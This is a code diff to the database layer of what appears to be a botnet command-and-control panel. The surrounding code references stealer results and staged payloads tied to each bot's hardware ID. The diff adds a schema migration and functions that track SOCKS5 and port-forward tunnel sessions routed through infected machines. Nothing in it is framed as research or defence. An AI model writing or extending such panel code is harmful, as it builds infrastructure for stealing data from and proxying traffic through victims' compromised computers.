@@ -15,7 +15,7 @@ logger = logging.getLogger(__name__)
 
 DB_PATH = Path(__file__).parent.parent.parent / "panel.db"
 DATA_DIR = Path(__file__).parent.parent.parent / "data"
-CURRENT_SCHEMA_VERSION = 4
+CURRENT_SCHEMA_VERSION = 5
 
 _db_lock = asyncio.Lock()
 _db_conn: aiosqlite.Connection | None = None
@@ -235,6 +235,25 @@ MIGRATIONS = {
             )""",
             "CREATE INDEX IF NOT EXISTS idx_stealer_results_bot ON stealer_results(bot_hwid)",
             "CREATE INDEX IF NOT EXISTS idx_stealer_results_time ON stealer_results(received_at DESC)",
+        ],
+    },
+    5: {
+        "description": "Add tunnel_sessions for SOCKS5 and portfwd tracking",
+        "up": [
+            """CREATE TABLE IF NOT EXISTS tunnel_sessions (
+                id TEXT PRIMARY KEY,
+                bot_hwid TEXT NOT NULL,
+                tunnel_type TEXT NOT NULL,
+                status TEXT DEFAULT 'pending',
+                local_port INTEGER,
+                remote_host TEXT,
+                remote_port INTEGER,
+                created_at INTEGER NOT NULL,
+                closed_at INTEGER,
+                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid)
+            )""",
+            "CREATE INDEX IF NOT EXISTS idx_tunnel_sessions_bot_hwid ON tunnel_sessions(bot_hwid)",
+            "CREATE INDEX IF NOT EXISTS idx_tunnel_sessions_status ON tunnel_sessions(status)",
         ],
     },
 }
@@ -856,3 +875,49 @@ async def list_active_staging_payloads(stage_number=...) -> list[dict]:
             (stage_number,),
         ) as cursor:
             return [dict(row) async for row in cursor]
+
+
+# =============================================================================
+# Tunnel session functions
+# =============================================================================
+
+
+async def create_tunnel_session(
+    session_id: str, bot_hwid: str, tunnel_type: str,
+    local_port: int | None = None, remote_host: str | None = None,
+    remote_port: int | None = None,
+) -> None:
+    db = await get_db()
+    await db.execute(
+        """INSERT INTO tunnel_sessions
+           (id, bot_hwid, tunnel_type, status, local_port, remote_host, remote_port, created_at)
+           VALUES (?, ?, ?, 'pending', ?, ?, ?, ?)""",
+        (session_id, bot_hwid, tunnel_type, local_port, remote_host, remote_port, int(time.time())),
+    )
+    await db.commit()
+
+
+async def set_tunnel_session_active(session_id: str, local_port: int) -> None:
+    db = await get_db()
+    await db.execute(
+        "UPDATE tunnel_sessions SET status='active', local_port=? WHERE id=?",
+        (local_port, session_id),
+    )
+    await db.commit()
+
+
+async def set_tunnel_session_closed(session_id: str) -> None:
+    db = await get_db()
+    await db.execute(
+        "UPDATE tunnel_sessions SET status='closed', closed_at=? WHERE id=?",
+        (int(time.time()), session_id),
+    )
+    await db.commit()
+
+
+async def get_tunnel_sessions(bot_hwid: str) -> list[dict]:
+    db = await get_db()
+    async with db.execute(
+        "SELECT * FROM tunnel_sessions WHERE bot_hwid=? ORDER BY created_at DESC", (bot_hwid,)
+    ) as cursor:
+        return [dict(row) for row in await cursor.fetchall()]
